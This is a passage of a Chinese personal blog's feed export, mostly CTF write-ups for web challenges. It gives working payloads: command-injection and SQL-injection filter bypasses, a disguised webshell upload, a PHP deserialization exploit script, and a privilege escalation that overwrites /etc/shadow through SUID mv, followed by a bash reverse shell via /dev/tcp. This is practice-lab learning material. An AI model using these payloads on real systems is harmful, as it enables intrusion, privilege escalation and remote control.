        <content type="html"><![CDATA[<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>&#x2F;robots下面有&#x2F;fAke_f1agggg.php一开始根据回显页面以为没用，但是响应头里面有东西！</p><p>&#x2F;fl4g.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就过滤了个空格和cat</p><p>md5那个地方一开始是自己去爆破用python，反正捣鼓了一段时间，其实应该先本地测的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;0e291242476940776845150308577824&quot;</span>==<span class="string">&quot;0e215962017&quot;</span></span><br></pre></td></tr></table></figure><p>php的弱比较，所以利用python写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> itertools.count(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> chars <span class="keyword">in</span> itertools.product(charset, repeat=length):</span><br><span class="line">        candidate = <span class="string">&#x27;0e&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line">        md5_hash = hashlib.md5(candidate.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0e&#x27;</span> == md5_hash[<span class="number">0</span>:<span class="number">2</span>:<span class="number">1</span>] <span class="keyword">and</span> md5_hash[<span class="number">2</span>::].isdigit():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到目标字符串：<span class="subst">&#123;candidate&#125;</span>     结果是:<span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;未找到长度为 <span class="subst">&#123;length&#125;</span> 的解，继续尝试更长字符串...&quot;</span>)</span><br></pre></td></tr></table></figure><p>好难跑，但还是跑出来了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1e4<span class="built_in">&amp;</span>md5=0e215962017<span class="built_in">&amp;</span>get<span class="built_in">_</span>flag=tac&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>考虑到是sql注入了，尝试：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;<span class="params">#</span>    不行，考虑数字类型</span><br><span class="line">1<span class="params">#</span>     可以，说明是数字类型</span><br><span class="line">1 or 1=1<span class="params">#</span>   student number not exists.贼奇怪，可能有过滤，只是没刻意提醒</span><br><span class="line">1/**/or/**/1=1<span class="params">#</span> 可以</span><br><span class="line">还有个大小写绕过</span><br><span class="line">-1/**/Union/**/sElect/**/1,2,3<span class="params">#</span></span><br><span class="line">-1/**/Union/**/sElect/**/1,2,(Select(group<span class="built_in">_</span>concat(value))from(flag))<span class="params">#</span></span><br></pre></td></tr></table></figure><p>也是一开始卡了，主要是过滤了没提醒！然后中间尝试了sqlmap的–temple参数，但是失败了，有工具还是好啊，但是工具一定要配合手测才更好！</p><p>现在发现思路很重要，不会的可以上网查，但是没思路就废了！所以我现在的想法就是注重思路的训练！</p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>有个注册页面，先注册登录再说，然后就只有一个头像上传的功能！</p><p>先上传一个仅改了后缀的一句话木马，然后发现有<code>exif_imagetype</code>有这个函数的检测，直接GIF89a绕过即可！</p><p>然后以为还要配合.user.ini没想到这题就是一个<code>exif_imagetype</code>后缀都没过滤！</p><p>然后访问上传地址直接getshell就行了！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星途ctf2025</title>
      <link href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/"/>
      <url>/2025/10/26/%E6%98%9F%E9%80%94ctf2025/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>突然感觉这个比赛考的东西挺好的，但是在打的时候太心急了！</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span>=<span class="variable language_">$this</span>-&gt;bro;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;qwe = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aer = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;asd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dfg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hjk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hjk = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dfg = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;say = <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;say;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fu =<span class="keyword">new</span> <span class="class"><span class="keyword">class</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ou = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;ou;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$hjkl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hjkl</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的链子挺简单的就不分析了，关键是如何去触发backdoor这个方法？</p><p><strong>分链子打法加&amp;引用</strong></p><p>所谓分链子就是链子一分为二呗，引用就是共享同一内存，这意味着，只要内存发生变化，&amp;引用也会发生变化</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Mason</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Ethan</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Grace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;say = <span class="variable">$c2</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;ou = [&amp;<span class="variable">$c2</span>-&gt;fu,<span class="string">&#x27;backdoor&#x27;</span>];     <span class="comment">//callable的形式去调用对象的方法</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><p>那么主要有两个疑问：</p><p>1.在触发<code>__toString</code>方法的时候为什么还要多创建一个<code>$c2 = new Chloe();</code>对象？</p><p>2.为什么在创建数组callable的时候第一个元素要加上&amp;？</p><p>对于第一个这就是我说的分链子，是为了让链子的结构更分明！那为什么要加&amp;呢？</p><p>这其实是一个<strong>先后顺序</strong>的问题！假设没有这个&amp;<code>$d-&gt;ou = [$c2-&gt;fu,&#39;backdoor&#39;];</code>你这个的第一个元素就是null，有&amp;这个那么就是第一个元素与<code>$c2-&gt;fu</code>共享同一内存地址，那么在序列化的时候就是&amp;null，但是在反序列化之后会触发<code>__toString</code>从而实现<code>$c2-&gt;fu</code>就是一个对象了！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：1，分链子 2，callable 3，引用内存共享</span><br></pre></td></tr></table></figure><h2 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h2><p><img src="/images/achieve/2025/10/1.png"></p><p>直接就有shell了！那会不会是没权限呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;fl*&quot;</span></span><br></pre></td></tr></table></figure><p>找了似乎没有，那只能考虑在当前用户没有权限的目录下了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwx------   1 root root 4096 Oct 21 06:33 root</span><br></pre></td></tr></table></figure><p>果然这个目录就只给了文件所有者权限</p><p>尝试suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mv</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><p>利用mv提权：构造恶意文件，然后mv移动污染&#x2F;etc&#x2F;shadow(这是存储用户密码的地方)</p><p>构造加盐加密的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt flag root</span><br><span class="line">openssl passwd：openssl 工具中用于生成密码哈希的子命令</span><br><span class="line">-1：指定使用 MD5 算法来生成哈希，这是 Linux 系统中常见且兼容的格式（通常以 $1$ 开头）</span><br><span class="line"><span class="comment">#$1$flag$Qiv1fGuuojJhoMNhwWehP.</span></span><br><span class="line">最终要写的：root:$1$flag<span class="variable">$Qiv1fGuuojJhoMNhwWehP</span>.:18000:0:99999:7:::</span><br></pre></td></tr></table></figure><p>写入文件（寻找可写目录）：</p><p><img src="/images/achieve/2025/10/1.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1;echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /home/ctfuser/txt</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;/usr/bin/mv /home/ctfuser/txt /etc/shadow</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/10/3.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：suid mv提权</span><br></pre></td></tr></table></figure><p>还有一题比赛时没看就懒得写了！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> suid提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新的开始</title>
      <link href="/2025/10/23/hello-world/"/>
      <url>/2025/10/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>早就想弄个blog记录学习了，但是之前一直觉得麻烦就一直在csdn发</p><p><a href="https://blog.csdn.net/2403_88003384?spm=1000.2115.3001.5343">rufeii_-CSDN博客</a></p><p>但是csdn这byd广告太多了，另外就是它的搜索检索有问题，于是就觉得不能再拖了！</p><p>自己还是太菜了，每天进步一点点吧，另外就是慢慢地学，不要急于求成！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
